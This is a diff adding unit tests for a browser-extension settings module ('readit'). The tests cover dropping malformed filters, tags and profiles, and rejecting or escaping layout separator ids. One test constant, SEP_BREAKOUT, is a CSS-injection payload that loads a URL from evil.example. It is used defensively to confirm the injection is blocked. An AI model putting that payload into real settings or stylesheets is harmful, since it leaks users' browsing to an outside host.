@@ -228,6 +228,93 @@ check("invalid array elements are dropped individually", () => {
   );
 });
 
+check("an element with several faults drops alone, not its whole array", () => {
+  const raw = stored();
+  raw.filters = [
+    { id: "f1", kind: "keyword", pattern: "a", enabled: true },
+    { id: "f2", kind: "keyword", pattern: "b", enabled: true },
+    { id: "bad" },
+    { id: "z", kind: "regex", pattern: "" },
+  ];
+  const r = repairSettings(raw);
+  assert.ok(r);
+  assert.deepEqual(r.settings.filters.map((f) => f.id), ["f1", "f2"]);
+  assert.equal(r.resetPaths.includes("filters"), false);
+});
+
+check("an empty element does not reset every setting", () => {
+  const raw = stored();
+  raw.tags = [{ username: "keep", label: "ok", color: "#123456", updatedAt: 1 }];
+  raw.filters = [
+    { id: "f1", kind: "keyword", pattern: "a", enabled: true },
+    { id: "f2", kind: "keyword", pattern: "b", enabled: true },
+    {},
+  ];
+  const r = repairSettings(raw);
+  assert.ok(r, "repair must not give up on one empty element");
+  assert.deepEqual(r.settings.filters.map((f) => f.id), ["f1", "f2"]);
+  assert.deepEqual(r.settings.tags.map((t) => t.username), ["keep"]);
+});
+
+check("a broken custom profile drops alone; other custom profiles stay", () => {
+  const raw = stored();
+  const base = raw.profiles[0];
+  raw.profiles = [
+    ...raw.profiles,
+    { ...base, id: "mine", name: "Mine", builtIn: false },
+    { ...base, id: undefined, name: undefined, builtIn: false },
+  ];
+  const r = repairSettings(raw);
+  assert.ok(r);
+  assert.ok(r.settings.profiles.some((p) => p.id === "mine"));
+});
+
+const SEP_BREAKOUT =
+  'x"]{} a[href*="/settings"]{background:url(https://evil.example/leak)} [y="';
+
+function columnLayoutSettings(): ReaditSettings {
+  const s = applyProfile(createDefaultSettings(), "dense-power");
+  s.flags.layoutSlots = true;
+  return s;
+}
+
+check("separator ids that could break out of CSS are rejected on import", () => {
+  const raw = JSON.parse(JSON.stringify(columnLayoutSettings()));
+  raw.layoutSlots.separators = [
+    { id: SEP_BREAKOUT, after: "leftNav", widthPx: 24 },
+    { id: "sep_ok_1", after: "main", widthPx: 24 },
+  ];
+  const m = migrateSettings(raw);
+  assert.deepEqual(m.layoutSlots.separators.map((s) => s.id), ["sep_ok_1"]);
+  assert.equal(buildStylesheet(m).includes("evil.example"), false);
+  const preview = previewImport({
+    kind: "readit-export",
+    schemaVersion: SETTINGS_VERSION,
+    exportedAt: 1,
+    settings: raw,
+  });
+  assert.ok(preview.ok);
+  assert.ok(
+    preview.warnings.some((w) => w.includes("layoutSlots.separators")),
+    `import preview must flag the drop: ${preview.warnings.join(" | ")}`,
+  );
+});
+
+check("separator ids are escaped in the stylesheet even if unvalidated", () => {
+  const s = columnLayoutSettings();
+  s.layoutSlots.separators = [{ id: "sep_ok_1", after: "main", widthPx: 24 }];
+  assert.ok(
+    buildStylesheet(s).includes('[data-readit-separator="sep_ok_1"]'),
+    "column layout must emit separator rules for this check to mean anything",
+  );
+  // Bypass the schema, as a future caller might.
+  s.layoutSlots.separators = [{ id: SEP_BREAKOUT, after: "main", widthPx: 24 }];
+  const css = buildStylesheet(s);
+  // The quote is escaped, so the string (and the selector) never closes early.
+  assert.equal(css.includes('[data-readit-separator="x"]'), false);
+  assert.ok(css.includes('[data-readit-separator="x\\"]{}'));
+});
+
 check("NaN/null widths (storage JSON) repair to defaults", () => {
   const raw = stored();
   raw.subredditOverrides = [
